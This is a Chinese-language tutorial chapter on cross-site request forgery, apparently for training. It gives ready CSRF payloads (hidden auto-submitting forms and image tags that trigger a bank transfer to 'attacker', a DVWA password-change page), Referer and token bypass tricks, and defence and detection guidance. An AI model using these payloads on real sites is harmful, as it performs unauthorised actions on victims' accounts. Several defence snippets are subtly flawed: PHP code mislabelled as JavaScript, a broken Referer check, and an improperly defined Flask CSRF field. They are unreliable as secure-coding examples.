# Chapter 5: CSRF 跨站请求伪造

## 5.1 CSRF 简介

CSRF (Cross-Site Request Forgery) 跨站请求伪造，是一种诱导受害者在已认证的 Web 应用上执行非预期操作的攻击。

## 5.2 CSRF 原理

1. 用户登录受信任网站 A
2. 网站 A 验证通过，返回 Session Cookie
3. 用户未登出网站 A，访问恶意网站 B
4. 网站 B 诱导用户向网站 A 发起请求
5. 浏览器携带 Cookie 向网站 A 发起请求
6. 网站 A 无法区分请求来源，执行了恶意操作

## 5.3 CSRF 攻击示例

### 5.3.1 GET 型 CSRF

```html
<!-- 图片标签 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">

<!-- 链接 -->
<a href="http://bank.com/transfer?to=attacker&amount=10000">领取红包</a>

<!-- script -->
<script src="http://bank.com/transfer?to=attacker&amount=10000"></script>
```

### 5.3.2 POST 型 CSRF

```html
<form action="http://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 5.3.3 自动提交

```html
<body onload="document.forms[0].submit()">
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
</body>
```

### 5.3.4 诱导点击

```html
<a href="http://bank.com/transfer?to=attacker&amount=10000" target="_blank">点击查看详情</a>
```

## 5.4 CSRF 攻击工具

### 5.4.1 Burp Suite CSRF PoC

**使用步骤：**
1. 抓取正常请求
2. 右键 → Engagement Tools → Generate CSRF PoC
3. 修改参数生成攻击代码

### 5.4.2 OWASP CSRFTester

**安装：**
```bash
# Kali 已集成在 OWASP ZAP 中
```

**使用：**
1. 配置浏览器代理
2. 启动 CSRFTester
3. 记录请求
4. 生成 PoC

### 5.4.3 Evilginx

中间人攻击框架，可以用于 CSRF 攻击。

```bash
# 安装
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
```

### 5.4.4 CSRF PoC 生成器

在线生成工具：
- https://security.love/CSRF Poc generator/
- https://crlf.me/

## 5.5 CSRF 实战

### DVWA CSRF 练习

**Low 级别：**
```
修改密码 URL:
http://192.168.1.100/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change

CSRF 页面:
<html>
<body>
<img src="http://192.168.1.100/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change">
</body>
</html>
```

**Medium 级别：**
- 检查 HTTP Referer 头
- 需要从相同域名发起请求
- 绕过方法：构造文件名包含目标域名

**High 级别：**
- 需要验证 Token
- 结合 XSS 获取 Token

## 5.6 CSRF 绕过技术

### 5.6.1 Referer 绕过

```html
<!-- 构造文件名 -->
http://target.com/attacker.html

<!-- 绕过 Referer 检查 -->
<meta name="referrer" content="no-referrer">
```

### 5.6.2 Token 泄露

- URL 中泄露 Token
- 页面中存在 Token
- XSS 获取 Token

### 5.6.3 CORS 绕过

如果目标存在 CORS 漏洞：

```javascript
fetch('http://target.com/api/change', {
    method: 'POST',
    credentials: 'include'
});
```

## 5.7 CSRF 防御

### 5.7.1 Token 验证

服务器生成随机 Token，验证请求中的 Token 是否有效。

**PHP：**
```php
// 生成 Token
session_start();
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// 验证 Token
function validateCSRF($token) {
    return isset($_SESSION['csrf_token']) && $token === $_SESSION['csrf_token'];
}

// 表单中嵌入
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
```

**Python (Flask)：**
```python
from flask_wtf import FlaskForm
from wtforms import StringField
from wtforms.validators import DataRequired

class MyForm(FlaskForm):
    csrf_token = StringField(validators=[DataRequired()])
```

### 5.7.2 验证 Referer

```php
$referer = $_SERVER['HTTP_REFERER'];
if (strpos($referer, 'example.com') !== 0) {
    die('Invalid referer');
}
```

### 5.7.3 SameSite Cookie

```php
# Set-Cookie
# Strict: 完全禁止
Set-Cookie: session=xxx; SameSite=Strict

# Lax: 导航请求允许
Set-Cookie: session=xxx; SameSite=Lax

# None: 允许跨站
Set-Cookie: session=xxx; SameSite=None; Secure
```

### 5.7.4 双重提交 Cookie

```javascript
function validateCSRF() {
    $cookie = $_COOKIE['csrf_token'];
    $form = $_POST['csrf_token'];
    return $cookie === $form;
}
```

### 5.7.5 验证 Origin 头

```php
$origin = $_SERVER['HTTP_ORIGIN'];
if (!in_array($origin, $allowed_origins)) {
    die('Invalid origin');
}
```

### 5.7.6 二次验证

重要操作需要二次确认：

```php
if ($action == 'transfer') {
    // 发送验证码
    sendSMS($phone, $code);
    // 验证
    if (!verifyCode($code)) {
        die('Invalid code');
    }
}
```

### 5.7.7 防御总结

| 防御措施 | 安全性 | 说明 |
|----------|--------|------|
| Token 验证 | 高 | 最佳方案 |
| SameSite Cookie | 高 | 浏览器级防护 |
| Referer 验证 | 中 | 可被绕过 |
| Origin 验证 | 中 | 需要正确配置 |
| 二次验证 | 高 | 重要操作确认 |
| CORS | 中 | 正确配置 |

## 5.8 检测 CSRF 漏洞

### 5.8.1 手动检测

1. 登录应用
2. 抓取关键请求
3. 移除 Token 或 Cookie
4. 重放请求
5. 如果成功则存在 CSRF

### 5.8.2 自动化检测

**CSRF Scanner：**
```bash
# OWASP ZAP
owasp-zap # 启动并扫描
```

**CSRFDetector：**
```bash
# 安装
pip install csrf-detector

# 使用
python -m csrf_detector http://target.com
```

### 5.8.3 检测要点

- [ ] 表单是否有 CSRF Token
- [ ] Token 是否随机
- [ ] Token 是否验证
- [ ] 是否有 Referer 验证
- [ ] 是否有 SameSite 限制
